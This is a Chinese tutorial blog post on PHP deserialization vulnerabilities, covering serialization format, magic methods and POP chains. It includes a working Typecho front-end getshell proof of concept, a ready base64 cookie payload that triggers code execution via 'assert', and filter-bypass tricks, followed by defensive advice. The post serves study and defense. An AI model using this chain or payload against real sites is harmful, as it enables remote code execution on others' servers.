---
title: PHP 反序列化漏洞利用与学习
key: 3aca71ec1973d8d042c63ac3a3495d4c
tags:
  - PHP
  - Summary
date: 2019-09-01 15:58:05
---

## PHP反序列化基础

### 序列化与反序列化

**序列化**是一种将对象状态转换为字节流的机制。**反序列化**是一个相反的过程，其中字节流用于重新创建内存中的实际对象。此机制用于**持久化**对象，便于数据(对象)的存储和(在网络节点中的)传输。

![](/assets/images/move/2019-09-01-16-47-19.png)


### PHP中的反序列化函数

序列化对象 - 在会话中存放对象，PHP提供了以下两个函数用于序列化与反序列化:

```php
serialize()    //Object → String
unserialize()  //String → Object
/* 1.序列化时只保留了对象的类名和变量
2.反序列化前上下文中应保证对象的类已定义*/
```

Demo:

```php
<?php
class Person {

    private $key;
    protected $role; 
    public $name;

    public function __set($property_name, $property_value) {
        $this->$property_name = $property_value;
    }

    public function ___get($property_name) {
        if(isset($this->$property_name)) {
            return $this->$property_name;
        } else {
            return null;
        }
    }

    public function Inf() {
        echo "Person: ".$this->name." : ".$this->role." : ".$this->id."\n";
    }
}

$per = new Person();
$per->name = 'Tom';
$per->role = 'admin';
$per->key = '07e1';
$per->Inf();
var_dump($per);
echo "\n";
echo serialize($per);
```

Response:

```php
Person: Tom : admin : 07e1
object(Person)#1 (3) {
  ["key":"Person":private]=>
  string(4) "07e1"
  ["role":protected]=>
  string(5) "admin"
  ["name"]=>
  string(3) "Tom"
}
O:6:"Person":3:{s:11:"Personkey";s:4:"07e1";s:7:"*role";s:5:"admin";s:4:"name";s:3:"Tom";}
```

序列化的字符串哥类型的表示形式分别为：

```php
- Integer : i:value;
- String : s:size:value;
- Boolean : b:value;
- Null : N;
- Array : a:size:{key definition;value definition;(repeated per element)}
- Object : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}
```

同时需要注意`private`和`protected`属性字段序列化后的格式：

```php
O:6:"Person":3:{s:11:"Personkey";s:4:"07e1";s:7:"*role";s:5:"admin";s:4:"name";s:3:"Tom";}
O:<class_name_length>:"<class_name>":<number_of_properties>:{<properties>}
```

- `%00Person%00key`->Person类中的private属性key;
- `%00*%00role`->Person类中的protected属性role;


### Magic Methods

PHP提供了许多**魔术方法**，允许我们在面向对象编程中做一些非常巧妙的技巧。这些方法由两个下划线前缀（__）标识，由开发者通过重载定义，在满足特定条件时**自动触发**。常见的魔术方法如下:

- `__sleep()`

对象被序列化之前触发，**返回**需要被序列化存储的**成员属性**，删除不必要的属性。

- `__wakeup()`

预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。

- `__toString()`

用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。

```php
__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发
```

## 不安全的反序列化

### 反序列化漏洞

序列化给我们传递对象提供了一种简单的方法。反序列化的数据本质上来说是没有危害的，用户可控数据进行反序列化是存在危害的，反序列化的危害，关键还是在于**可控或不可控**。

不安全的反序列化通常会导致**远程代码执行**。即使反序列化漏洞不会导致远程代码执行，它们也可用于执行攻击，包括**重放攻击**，**注入攻击**和**权限提升攻击**。

![](/assets/images/move/2019-09-02-00-06-06.png)

如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。

这可能导致两种主要类型的攻击：

- 如果应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为**对象和数据结构攻击**。

- 典型的**数据篡改攻击**，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。

在应用程序中，序列化可能被用于:

- 远程和进程间通信（RPC / IPC）
- 连线协议、Web服务、消息代理
- 缓存/持久性
- 数据库、缓存服务器、文件系统
- HTTP cookie、HTML表单参数、API身份验证令牌

### 常见的挖掘方法

- 可控的反序列点(参数可控)

- 反序列化类中的魔术方法

- 魔术方法中的敏感操作/危险函数

- 构造POP链

\> \> 面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。

`POP CHAIN`：**把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。**

通俗点就是：**反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。**


## 漏洞实例分析

### Typecho前台GETShell

![](/assets/images/move/2019-09-02-00-15-29.png)

首先进入`index.php` line 58-76 处观察到漏洞复现的前置判断条件代码：

```php
//判断是否已经安装
if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {
    exit;
}

// 挡掉可能的跨站请求
if (!empty($_GET) || !empty($_POST)) {
    if (empty($_SERVER['HTTP_REFERER'])) {
        exit;
    }

    $parts = parse_url($_SERVER['HTTP_REFERER']);
	if (!empty($parts['port'])) {
        $parts['host'] = "{$parts['host']}:{$parts['port']}";
    }

    if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {
        exit;
    }
}
```

这里对是否安装以及跨站请求进行了判断，可以通过设置GET`finish`参数和HTTP`Refer`为站内URL即可。

跟进代码，找到漏洞入口->反序列化参数可控点，install.php Line 229-235:

```php
<?php
$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
Typecho_Cookie::delete('__typecho_config');
$db = new Typecho_Db($config['adapter'], $config['prefix']);
$db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);
Typecho_Db::set($db);
?>
```

这里进入`/var/Typecho/Cookie.php`，定位到**Typecho_Cookie::get()**:

![](/assets/images/move/2019-09-02-00-27-12.png)

可以发现`__typecho_config`参数可控，可以通过POST方法赋值。

```php
__typecho_config -> $config -> new Typecho_Db($config['adapter'], $config['prefix'])
```

跟进到**Typecho_Db**类，挖掘相关魔术方法:

![](/assets/images/move/2019-09-02-00-34-06.png)

adapterName对应config里面的config里面的adapter，如果我们用adapter来实例化一个类，PHP是一个弱类型的语言，当把一个字符串和一个类进行拼接的时候，会把类转换成字符串，这个时候就会触发`__toString()`函数。

在**Typecho_Feed**类中挖掘到**__toString()**魔术方法:

![](/assets/images/move/2019-09-02-00-36-27.png)

$item取自$this->_items，$this->_items为类Typecho_Feed中的一个Private属性。

在这里如果可以将$item\['author'\]定义为一个类，则在执行$item\['author'\]->screenName时则会自动调用`__get()`.

在**Typecho_Request**类中挖掘到**__get()**魔术方法:

![](/assets/images/move/2019-09-02-00-40-17.png)

跟进进入**_applyFilter()**函数：

![](/assets/images/move/2019-09-02-00-42-12.png)

```php
array_map() 为数组的每一个元素应用回调函数 eg: array_map(‘phpinfo’, array(1,2,3)); 
call_user_func() 把第一个参数作为回调参数调用，其余参数是回调函数的参数 eg: call_user_func(‘phpinfo’,1);
```

我们找到了`call_user_func`函数，回溯整个利用链:

我们可以通过设置`item\['author'\]`来控制**Typecho_Request**类中的私有变量，这样类中的`_filter`和`_params\['screenName'\]`都可控，`call_user_func`函数变量可控，任意代码执行。

```php
Typecho_Db::__construct()
Typecho_Feed::__toString()
Typecho_Request::__get()
Typecho_Request::get()
Typecho_Request::_applyFilter()
call_user_func() / array_map()
```

- POC

![](/assets/images/move/2019-09-02-00-47-23.png)

```php
<?php
class Typecho_Request
{
	private $_params = array();
	private $_filter = array();
	
	public function __construct() {
		$this->_params['screenName'] = 'phpinfo()';
		$this->_filter[0] = 'assert';
	}
}
class Typecho_Feed
{
	const RSS2 = 'RSS 2.0';
	
	private $_type;
	private $_items;
	
	public function __construct() {
		$this->_type = $this::RSS2;
		$this->_items[0] = array(
			'category' => array(new Typecho_Request()),
			'author' => new Typecho_Request(),
			);
	}
}
$exp = array(
		'adapter' => new Typecho_Feed(),
		'prefix' => 'typecho_'
		);

echo base64_encode(serialize($exp));
```
- Payload

```php
__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToyOntzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=
```

![](/assets/images/move/2019-09-02-00-52-28.png)

## 一些绕过技巧

- `__wakeup()`绕过

`CVE-2016-7124` 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。

- 正则匹配绕过

可在`number_of_properties`字段前添加`+`绕过形如`/[oc]:\d+:/i`的正则匹配。

```php
O:6:"Person":+3:{s:11:"Personkey";s:4:"07e1";s:7:"*role";s:5:"admin";s:4:"name";s:3:"Tom";}
```

## 常见防御手段

> 唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。

- 执行**完整性检查**，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。

- 在创建对象之前强制执行严格的**类型约束**，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。

- 如果可能，**隔离运行**那些在低特权环境中反序列化的代码。

- 记录反序列化的例外情况和失败信息，如：传入的类型不是预期的类型，或者反序列处理引发的例外情况。

- 限制或监视来自于容器或服务器传入和传出的反序列化网络连接。

- 监控反序列化，当用户持续进行反序列化时，对用户进行警告。


## Reference*

- [PHP反序列化由浅入深](https://xz.aliyun.com/t/3674)

- [OWASP Top 10 2017](https://www.owasp.org/images/d/dc/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.3.pdf)









